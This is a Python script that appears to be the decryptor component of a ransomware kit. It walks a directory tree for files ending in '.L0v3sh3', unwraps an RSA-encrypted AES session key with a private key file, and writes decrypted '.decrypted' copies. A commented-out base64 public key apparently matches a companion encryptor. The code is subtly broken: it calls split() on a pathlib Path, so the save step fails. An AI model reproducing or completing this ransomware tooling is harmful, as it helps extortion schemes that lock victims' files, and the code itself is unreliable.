import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


# public key with base64 encoding

# for decrypting file, you doesn't need public key

#pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6aFFqanppMllMdkhORmMvSFgrNgpUcHBXNHB4VFdZRUErM1Fya2Jqd2ZxeEg4b3NmV0xlQ2R1M1VxZ1Rwc0dmTXVReE85T3JUR2I1ZXduY01EZUFUCmVFd0I1QXA5QnF0MUNFYTI4SWZHYXNESWVSZWZKUlBIQUUrZ0FYUHYwUGxVOHVvcEE2YUZ5NEFMVHE5TXpVaWUKbzlwOXB5QW9KK0lnMHIwdGk5SjY4Rk5aUUJaeDl1MlhORnBnUUR2MGZvcGRDWnVGZFBZRnliSmloNnpLVjV3cQpVdS96YmswWm45aXd0WVNCNVhaR1E1ZlJYbkcxejVwREE3RVhaVjNPR3RKWVpDb29oN3hUZmoyejM3WkZKbGQyCmM1aDFtRHVHNjV6ZnlsbFgrc1Y2TS9OMnkxZGZaYXM2RjQxYmdyY1liSnFveDZ0aDVRN09QYUpqbThQTnlSaFoKb3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
#pubKey = base64.b64decode(pubKey)

privateKeyFile = 'private.pem'


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def decrypt(dataFile, privateKeyFile):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''

    # read private key from file
    extension = dataFile.suffix.lower()
    with open(privateKeyFile, 'rb') as f:
        privateKey = f.read()
        # create private key object
        key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    fileName= dataFile.split(extension)[0]
    fileExtension = '.decrypted' # mark the file was decrypted
    decryptedFile = fileName + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)

directory = '../' # CHANGE THIS

# because we need to decrypt file focus on .L0v3sh3 extension here is the code
includeExtension = ['.L0v3sh3'] # CHANGE THIS
for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    
    # run the decryptor just if the extension is .L0v3sh3
    if fileType in includeExtension:
        decrypt(filePath, privateKeyFile)
